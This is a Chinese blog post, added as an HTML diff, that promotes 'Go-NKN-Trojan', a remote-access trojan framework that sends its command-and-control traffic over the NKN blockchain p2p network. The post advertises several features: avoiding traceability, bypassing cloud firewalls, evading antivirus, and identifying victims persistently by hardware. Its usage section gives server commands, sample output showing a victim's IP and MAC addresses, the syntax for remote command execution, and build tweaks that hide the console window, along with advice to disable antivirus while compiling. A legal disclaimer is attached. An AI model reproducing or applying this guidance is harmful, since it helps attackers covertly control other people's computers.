@@ -1,0 +1,224 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>一款Go编写的简易远控，由区块链项目NKN实现的p2p通信 - SaberCC Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="SaberCC,"> 
+    <meta name="description" content="Go-NKN-Trojan一款由区块链的核心网络技术p2p实现的去中心化去C2的基础远控木马框架
+目前该项目只开源了命令执行功能为测试可行性，其余功能可自行追加。
+本项目是在旧版goland编写，旧,"> 
+    <meta name="author" content="SaberCC"> 
+    <link rel="alternative" href="atom.xml" title="SaberCC Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.ico"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="一款Go编写的简易远控，由区块链项目NKN实现的p2p通信 - SaberCC Blog"/>
+    <meta name="twitter:description" content="Go-NKN-Trojan一款由区块链的核心网络技术p2p实现的去中心化去C2的基础远控木马框架
+目前该项目只开源了命令执行功能为测试可行性，其余功能可自行追加。
+本项目是在旧版goland编写，旧,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="SaberCC Blog"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="一款Go编写的简易远控，由区块链项目NKN实现的p2p通信 - SaberCC Blog"/>
+    <meta property="og:description" content="Go-NKN-Trojan一款由区块链的核心网络技术p2p实现的去中心化去C2的基础远控木马框架
+目前该项目只开源了命令执行功能为测试可行性，其余功能可自行追加。
+本项目是在旧版goland编写，旧,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">SaberCC Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://ccalt.cn"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">一款Go编写的简易远控，由区块链项目NKN实现的p2p通信</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">一款Go编写的简易远控，由区块链项目NKN实现的p2p通信</h1>
+        <div class="stuff">
+            <span>九月 01, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E8%BF%9C%E6%8E%A7/" rel="tag">远控</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Go-NKN-Trojan"><a href="#Go-NKN-Trojan" class="headerlink" title="Go-NKN-Trojan"></a>Go-NKN-Trojan</h1><p>一款由区块链的核心网络技术p2p实现的去中心化去C2的基础远控木马框架</p>
+<p><strong>目前该项目只开源了命令执行功能为测试可行性，其余功能可自行追加。</strong></p>
+<p><strong>本项目是在旧版goland编写，旧版goland+Go1.18会报import错误，无视即可正常编译</strong></p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p><strong>解决木马C2服务的痛点，方法不同于域前置、白域名等手段，通信采用p2p作为通信基础架构，调用区块链NKN-SDK实现p2p通信，取消传统C2模式，控制端无需公网IP减少成本并且可以有效防止被溯源,并且可绕过云上流量防火墙管制。</strong></p>
+<p><strong>木马通过对主机一部分硬件设备信息进行收集整合生成该设备唯一指定ID，即使主机重装操作系统也不改变控制ID，通过此ID目标主机持续对控制端进行心跳式回连保证控制端不丢失目标主机，同时防止目标主机出现意外状况再次上线后ID变化。</strong></p>
+<p><strong>最近更新:目前会被火绒误报为挖矿病毒，通过微步沙箱检测到的外连IP，虽然没有控制端真实IP，但是程序会连接NKN主网域名。原因初步判断为检测到程序连接NKN主网域名，与挖矿病毒初步行为相似，被误报为挖矿进程</strong></p>
+<img src="/2022/09/01/%E4%B8%80%E6%AC%BEGo%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E6%98%93%E8%BF%9C%E6%8E%A7%EF%BC%8C%E7%94%B1%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AENKN%E5%AE%9E%E7%8E%B0%E7%9A%84p2p%E9%80%9A%E4%BF%A1/1.png" class="" width="1">
+
+<p><strong>免杀性能优秀</strong></p>
+<img src="/2022/09/01/%E4%B8%80%E6%AC%BEGo%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E6%98%93%E8%BF%9C%E6%8E%A7%EF%BC%8C%E7%94%B1%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AENKN%E5%AE%9E%E7%8E%B0%E7%9A%84p2p%E9%80%9A%E4%BF%A1/3.png" class="" width="3">
+
+<img src="/2022/09/01/%E4%B8%80%E6%AC%BEGo%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E6%98%93%E8%BF%9C%E6%8E%A7%EF%BC%8C%E7%94%B1%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AENKN%E5%AE%9E%E7%8E%B0%E7%9A%84p2p%E9%80%9A%E4%BF%A1/2.png" class="" width="2">
+
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.依据《刑法修正案（七）》第9条增订的《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息系罪的，处3年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。</span><br><span class="line">2.第二百八十五条第二款 违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</span><br><span class="line">3.刑法第二百五十三条之一：“国家机关或者金融、电信、交通、教育、医疗等单位的工作人员，违反国家规定，将本单位在履行职责或者提供服务过程中获得的公民个人信息，出售或者非法提供给他人，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</span><br></pre></td></tr></table></figure>
+
+<p><strong>由于传播、利用开源信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，作者不承担任何责任。</strong></p>
+<p><strong>开源仅作为安全研究之用！切勿用作实战用途！仅限于本地复现！</strong></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p><strong>首先需要随机生成一个64位seed，调用下列命令即可。该种子将作为的控制者的唯一标识ID，切勿丢失</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server.exe -g new</span><br></pre></td></tr></table></figure>
+
+<p><strong>将64位seed加载读入程序中，控制端将生成该seed的唯一控制ID，控制ID格式为monitor.xxxx….</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server.exe -g e6178488d64cf94703f68c57cbdd7eb634a773ba119c7646a4394bac993e47f3</span><br></pre></td></tr></table></figure>
+
+<p>展示结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your controlid = monitor.8146bae11e3f976c105f7cace9a96bed0dfdb0bdec2f1a8313e46d93726a77c7</span><br></pre></td></tr></table></figure>
+
+<p><strong>启动监听后，监听中若有目标机回连将会显示目标ID，该ID固定格式为xxxx.xxxx….，并且会同时会显示目标机公网IP、内网IP、MAC地址</strong>。展示结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target host connect, ID: 09d3.31642085613f0c6e34dff8b9ffc5d330746cd38ddb61fa2cd4884c5f9e634a0b ,target IP address : xxx.xxx.xxx.xx|xxx.xxx.xxx.xxx|xx:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>
+
+<p><strong>对目标机执行命令格式为：目标机ID 命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">09d3.31642085613f0c6e34dff8b9ffc5d330746cd38ddb61fa2cd4884c5f9e634a0b whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p><strong>将server中生成的控制端ID写入Client Code的controlid变量，编译即可。</strong></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong>由于调用NKN-SDK进行编译，所以体积较大，可以使用压缩壳缩小体积</strong></p>
+<p>可能会被一些安全产品误报为挖矿病毒，火绒会对区块链相关的编译工具报毒，编译时需关闭火绒或设置信任区。</p>
+<p>Windows、Linux皆可成功编译执行，但若Windows平台若需要取消程序弹出CMD框，需要修改command.go配置，WindowsCommand所属Exec()函数中SysProcAttr追加HideWindow: true参数，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;syscall.SysProcAttr&#123;HideWindow: true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译参数需要追加参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-ldflags &quot;-s -w -H=windowsgui&quot;</span><br></pre></td></tr></table></figure>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/565841117.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
